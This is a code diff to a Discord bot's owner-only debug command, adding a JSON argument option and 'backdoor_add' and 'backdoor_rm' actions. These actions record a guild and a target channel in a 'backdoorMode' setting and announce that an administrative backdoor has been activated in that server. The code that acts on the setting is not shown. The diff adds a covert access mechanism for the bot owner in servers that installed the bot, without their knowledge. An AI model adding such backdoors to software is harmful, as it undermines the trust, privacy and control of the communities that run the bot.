@@ -9,12 +9,19 @@ module.exports = {
 		.setDescription('Developer debug command (owner-only)')
 		.addStringOption(option =>
 			option.setName('action')
-				.setDescription('The developer action'))
+				.setDescription('The developer action')
+				.setRequired(true))
+		.addStringOption(option =>
+			option.setName('data')
+				.setDescription('Optional args (JSON) to pass to the debug cmd')
+				.setRequired(false))
 		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
 
 	async execute(interaction: CommandInteraction) {
 		if (interaction.user?.id === globals.OWNER_ID) {
 			const action = interaction.options.get('action')?.value as string || 'general';
+			const json = interaction.options.get('data')?.value as string || '{}';
+			const data = JSON.parse(json);
 			if (action === "general") {
 				const e = SterlingEmbed.developer();
 				const fieldValue = Object.keys(UserManager.users).length.toString() + ' users';
@@ -67,6 +74,29 @@ module.exports = {
 						});
 					}
 				}
+			} else if (action === "backdoor_add") {
+				let guildId = data.guild as string;
+				let targetChannelId = data.target as string;
+				let backdoors = interaction.client.settings.get('backdoorMode') as Map<string, string>;
+				backdoors.set(guildId, targetChannelId);
+				interaction.client.settings.set('backdoorMode', backdoors);
+				const e = SterlingEmbed.developer()
+					.setTitle('Backdoor Enabled')
+					.setDescription(`An adminstrative backdoor has been activated in "${(await interaction.client.guilds.fetch(guildId)).name}"`);
+				await interaction.reply({
+					embeds: [e.export()]
+				});
+			} else if (action === "backdoor_rm") {
+				let guildId = data.guild as string;
+				let backdoors = interaction.client.settings.get('backdoorMode') as Map<string, string>;
+				backdoors.delete(guildId);
+				interaction.client.settings.set('backdoorMode', backdoors);
+				const e = SterlingEmbed.developer()
+					.setTitle('Backdoor Disabled')
+					.setDescription(`An adminstrative backdoor has been deactivated in "${(await interaction.client.guilds.fetch(guildId)).name}"`);
+				await interaction.reply({
+					embeds: [e.export()]
+				});
 			}
 		} else {
 			await interaction.reply({
